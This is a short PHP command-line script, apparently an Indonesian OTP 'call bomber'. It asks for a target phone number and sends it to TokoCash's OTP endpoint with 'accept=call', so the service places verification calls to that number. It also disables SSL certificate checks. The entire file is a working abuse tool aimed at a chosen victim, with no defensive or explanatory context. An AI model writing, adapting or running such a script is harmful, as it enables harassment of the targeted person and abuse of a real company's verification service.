<?php

function main($phone){

     $ch = curl_init();

     curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_HEADER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");
     $result = curl_exec($ch);
     curl_close($ch);
     echo $result."\n";
}

echo "(ex 62xxxxxxxxxxx)\n";
echo "Masukkan Nomor Target : ";
$nomor = trim(fgets(STDIN));
$execute = main($nomor);
print $execute;






?>
